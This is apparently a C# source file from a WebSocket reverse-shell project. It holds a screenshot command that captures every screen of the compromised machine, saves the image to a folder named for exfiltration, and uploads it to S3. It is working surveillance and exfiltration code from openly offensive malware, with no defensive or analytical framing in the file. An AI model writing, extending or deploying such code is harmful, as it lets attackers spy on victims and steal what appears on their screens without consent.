using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using System.IO;

using System.Drawing;
using System.Windows.Forms;
using System.ComponentModel;
using System.Drawing.Imaging;
using WebSocketReverseShellDotNet.utils;

namespace WebSocketReverseShellDotNet.service.commands
{
    public class ScreenShot : Command
    {



        public string ExecuteCommand(string command)
        {
            StringBuilder sb = new StringBuilder();

            try
            {

                OSUtil.CreateDirectoryInTmpFolder(Constants.EXFILTRATE_FOLDER);

                String path = OSUtil.GetSystemTempDir()+ Constants.EXFILTRATE_FOLDER +"\\" +"screenshot.jpeg";
                var combinedBounds = GetCombinedScreenBounds();
                TakeAndSave(path, combinedBounds, ImageFormat.Jpeg);
                
                sb.AppendLine($"Saved screen successfuly in '{path}'. ");
                FileInfo fileToUpload = new FileInfo(path);
                sb.AppendLine(S3Uploadutil.UploadToS3(fileToUpload));
                

                return sb.ToString();
            }
            catch (Exception ex)
            {
                return "error while saving screenShot: "+ex.Message;
            }

        }

        private static Rectangle GetCombinedScreenBounds()
        {
            // Get the combined bounds of all screens
            var combinedBounds = new Rectangle();
            foreach (var screen in Screen.AllScreens)
            {
                combinedBounds = Rectangle.Union(combinedBounds, screen.Bounds);
            }
            combinedBounds.Inflate(800, 800);

       
            
            return combinedBounds;
        }

        private static Bitmap CopyFromScreen(Rectangle bounds)
        {
            try
            {
                var image = new Bitmap(bounds.Width, bounds.Height);
                using (var graphics = Graphics.FromImage(image))
                {
#pragma warning disable CA1416 // Validate platform compatibility
                    graphics.CopyFromScreen(bounds.Location, Point.Empty, bounds.Size);
#pragma warning restore CA1416 // Validate platform compatibility
                }
                return image;
            }
            catch (Win32Exception)
            {
                // When the screen saver is active or other issues occur
                return null;
            }
        }

        public static void TakeAndSave(string path, Rectangle bounds, ImageFormat imageFormat)
        {
            using (var image = CopyFromScreen(bounds))
            {
                image.Save(path, imageFormat);
            }
        }
 


    }
}
